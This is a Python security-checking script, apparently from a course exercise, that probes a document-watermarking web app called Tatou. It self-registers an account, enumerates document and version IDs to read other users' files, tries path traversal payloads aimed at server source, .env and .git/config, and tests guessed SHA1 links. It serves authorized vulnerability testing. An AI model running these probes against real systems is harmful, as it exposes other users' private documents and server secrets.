#!/usr/bin/env python3
"""
Tatou IDOR / path-confinement exploit checker.
Usage: python3 exploit_check.py TARGET_URL [EMAIL PASSWORD]

If EMAIL/PASSWORD are omitted, it registers a throwaway account on the
target (works if the target's /api/create-user is open, which is normal
for this app). Only run this against hosts you are authorized to test
under your course's rules of engagement.
"""
import json, re, sys, uuid, urllib.request, urllib.error

if len(sys.argv) < 2:
    print(__doc__); sys.exit(1)

BASE = sys.argv[1].rstrip("/")
findings = []

def req(method, path, token=None, body=None, raw=None, headers=None):
    h = dict(headers or {})
    data = raw
    if body is not None:
        data = json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    if token:
        h["Authorization"] = f"Bearer {token}"
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def jl(b):
    try: return json.loads(b)
    except Exception: return {}

def flag(name, detail=""):
    findings.append(name)
    print(f"[VULNERABLE] {name}  {detail}")

def ok(name):
    print(f"[ok] {name}")

# --- auth ---
if len(sys.argv) >= 4:
    email, pw = sys.argv[2], sys.argv[3]
    c, b = req("POST", "/api/login", body={"email": email, "password": pw})
    if c != 200:
        print("login failed"); sys.exit(1)
    token = jl(b)["token"]
else:
    s = uuid.uuid4().hex[:8]
    email, login, pw = f"probe_{s}@test.local", f"probe_{s}", "Passw0rd!Passw0rd"
    c, b = req("POST", "/api/create-user", body={"email": email, "login": login, "password": pw})
    if c != 201:
        print("could not self-register — pass EMAIL PASSWORD for an existing account"); sys.exit(1)
    c, b = req("POST", "/api/login", body={"email": email, "password": pw})
    token = jl(b)["token"]
print(f"Authenticated as {email}\n")

# --- 1. enumerate other users' document ids via IDOR, see which leak content ---
print("== Probing document IDOR across id range ==")
MAX_ID = 200
readable = []
for did in range(1, MAX_ID + 1):
    c, b = req("GET", f"/api/get-document/{did}", token=token)
    if c == 200:
        readable.append(did)
        flag("IDOR get-document", f"id={did} returned {len(b)} bytes of PDF you don't own")
    elif c not in (404, 400):
        print(f"  id={did} unexpected status {c}")

if not readable:
    ok("get-document: no cross-account reads (IDOR fixed)")

# --- 2. same for list-versions / read-watermark on any id you can enumerate ---
print("\n== Probing version/watermark IDOR ==")
c, b = req("GET", "/api/get-watermarking-methods")
methods = [m["name"] for m in jl(b).get("methods", [])]
for did in range(1, MAX_ID + 1):
    c, b = req("GET", f"/api/list-versions/{did}", token=token)
    if c == 200:
        versions = jl(b).get("versions", [])
        if versions:
            flag("IDOR list-versions", f"id={did} exposed {len(versions)} version row(s)")
            for v in versions:
                link = v.get("link")
                if link:
                    c2, b2 = req("GET", f"/api/get-version/{link}")
                    if c2 == 200:
                        flag("readable watermark link", f"id={did} link={link} ({len(b2)} bytes)")

# --- 3. path traversal on static route ---
print("\n== Probing static-route traversal ==")
for p in ["/../server/src/server.py", "/%2e%2e/server/src/server.py",
          "/..%2fserver.py", "/.env", "/.git/config", "/static/../../server.py"]:
    c, b = req("GET", p)
    if c == 200 and (b"create_app" in b or b"SECRET_KEY" in b or b"DB_PASSWORD" in b):
        flag("path traversal / source disclosure", p)

# --- 4. legacy SHA1 link acceptance (link length 40) ---
print("\n== Probing legacy link format ==")
import hashlib
guess = hashlib.sha1(b"document.pdf").hexdigest()
c, b = req("GET", f"/api/get-version/{guess}")
if c == 200:
    flag("legacy SHA1 link accepted", guess)

print(f"\n{len(findings)} finding(s).")
for f in findings:
    print(" -", f)
sys.exit(1 if findings else 0)
